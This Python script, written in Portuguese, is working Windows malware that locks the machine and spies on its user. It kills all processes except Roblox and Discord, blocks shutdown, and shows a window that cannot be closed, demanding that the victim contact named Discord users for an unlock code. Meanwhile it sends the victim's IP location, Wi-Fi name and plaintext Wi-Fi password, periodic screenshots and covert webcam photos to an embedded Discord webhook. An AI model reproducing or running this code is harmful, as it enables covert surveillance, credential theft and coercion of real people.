import os
import shutil
import socket
import requests
import pyautogui
import cv2
import time
import tempfile
import subprocess
import ctypes
from datetime import datetime
from threading import Thread
import pytz
import tkinter as tk
from tkinter import messagebox
import keyboard  # para ouvir atalhos de teclado

# --- CONFIGURAÇÕES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1394031732721979422/doqnuLAykcwssJWYCTJ5hdR-zLIiPj716YuOGAwvqQ_XRAYP3dwtg6QsLogDzi5sSL8A"
CODIGO_SECRETO = "jolgue"  # Código para desbloquear
INTERVALO_MINUTOS = 5
APPS_PERMITIDOS = ["RobloxPlayerBeta.exe", "Discord.exe"]
TEXTO_AVISO = (
    "⚠️ Está tudo bloqueado tirando o Roblox e o Discord.\n"
    "Fala com o “goncal_fruits._69394” ou com o “jolgue_011” no Discord para desbloquear o teu PC."
)

# --- FUNÇÕES AUXILIARES ---

def enviar_webhook(mensagem, ficheiro=None):
    data = {"content": mensagem}
    files = {}
    if ficheiro:
        files["file"] = (os.path.basename(ficheiro), open(ficheiro, 'rb'))
    requests.post(WEBHOOK_URL, data=data, files=files)

def obter_ip_localizacao():
    try:
        response = requests.get("http://ip-api.com/json/")
        info = response.json()
        return (
            f"IP: {info.get('query')}\n"
            f"Cidade: {info.get('city')}\n"
            f"Região: {info.get('regionName')}\n"
            f"País: {info.get('country')}\n"
            f"ISP: {info.get('isp')}\n"
        )
    except:
        return "Não foi possível obter a localização."

def obter_ssid():
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'SSID' in linha and 'BSSID' not in linha:
                return linha.split(':')[1].strip()
    except:
        return "Não foi possível obter o SSID"

def obter_senha_wifi(ssid):
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'Key Content' in linha:
                return linha.split(':')[1].strip()
        return "Senha não encontrada"
    except:
        return "Não foi possível obter a senha"

def tirar_screenshot():
    caminho = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(caminho)
    return caminho

def tirar_foto_webcam():
    caminho = os.path.join(tempfile.gettempdir(), "webcam.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(caminho, frame)
    cam.release()
    return caminho

def bloquear_apps():
    while True:
        if desbloqueado[0]:
            break
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore")
        for linha in procs.split("\n"):
            for proc in linha.split():
                if proc.endswith(".exe") and proc not in APPS_PERMITIDOS:
                    try:
                        subprocess.call(f"taskkill /f /im {proc}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
        # Bloquear encerrar e reiniciar
        try:
            subprocess.call("shutdown -a", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        time.sleep(1)

def definir_papel_preto():
    SPI_SETDESKWALLPAPER = 20
    preto_path = os.path.join(tempfile.gettempdir(), "preto.bmp")
    # Criar imagem preta
    with open(preto_path, 'wb') as f:
        f.write(b'BM6\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00'
                b'\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x0B\x00\x00\x13\x0B\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00')
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, preto_path, 3)

def obter_horas():
    hora_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        fuso_portugal = pytz.timezone("Europe/Lisbon")
        hora_portugal = datetime.now(fuso_portugal).strftime("%Y-%m-%d %H:%M:%S")
    except:
        hora_portugal = "Erro ao obter hora Portugal"
    return hora_local, hora_portugal

def janela_mensagem():
    def continuar():
        root.destroy()
        janela_desbloqueio()

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("600x300")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text=TEXTO_AVISO, font=("Arial", 14), justify="center", wraplength=500).pack(pady=40)
    tk.Button(root, text="OK", command=continuar, font=("Arial", 12)).pack(pady=20)
    root.mainloop()

def janela_desbloqueio():
    def tentar_desbloquear():
        if entrada.get() == CODIGO_SECRETO:
            desbloqueado[0] = True
            enviar_webhook("🔓 Código correto inserido. PC desbloqueado.")
            root.destroy()
        else:
            messagebox.showerror("Erro", "Código incorreto!")

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("400x200")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text="Insira o código para desbloquear:", font=("Arial", 14)).pack(pady=20)
    entrada = tk.Entry(root, font=("Arial", 14), show="*")
    entrada.pack(pady=10)
    tk.Button(root, text="Desbloquear", command=tentar_desbloquear, font=("Arial", 12)).pack(pady=10)
    root.mainloop()

def atalho_secreto():
    keyboard.add_hotkey('ctrl+shift+g', desbloquear_forcado)

def desbloquear_forcado():
    if not desbloqueado[0]:
        desbloqueado[0] = True
        enviar_webhook("🚨 PC desbloqueado com CTRL+SHIFT+G (atalho de emergência)")

# --- EXECUÇÃO INICIAL ---
hostname = socket.gethostname()
info_localizacao = obter_ip_localizacao()
ssid = obter_ssid()
senha_wifi = obter_senha_wifi(ssid)

enviar_webhook(
    f"📡 Monitorização iniciada no PC: {hostname}\n"
    f"{info_localizacao}"
    f"Wi-Fi: {ssid}\n"
    f"Senha Wi-Fi: {senha_wifi}\n"
)

desbloqueado = [False]

# Definir papel de parede preto
definir_papel_preto()

# --- THREADS ---
Thread(target=bloquear_apps, daemon=True).start()
Thread(target=janela_mensagem, daemon=True).start()
Thread(target=atalho_secreto, daemon=True).start()

# --- LOOP CONTÍNUO ---
while not desbloqueado[0]:
    try:
        hora_local, hora_portugal = obter_horas()

        screenshot = tirar_screenshot()
        enviar_webhook(f"🖥️ Screenshot de {hostname} | Hora PC: {hora_local} | Hora Portugal: {hora_portugal}", ficheiro=screenshot)
        os.remove(screenshot)

        webcam = tirar_foto_webcam()
        enviar_webhook(f"📷 Webcam de {hostname} | Hora PC: {hora_local} | Hora Portugal: {hora_portugal}", ficheiro=webcam)
        os.remove(webcam)
    except Exception as e:
        enviar_webhook(f"⚠️ Erro: {e}")

    time.sleep(INTERVALO_MINUTOS * 60)
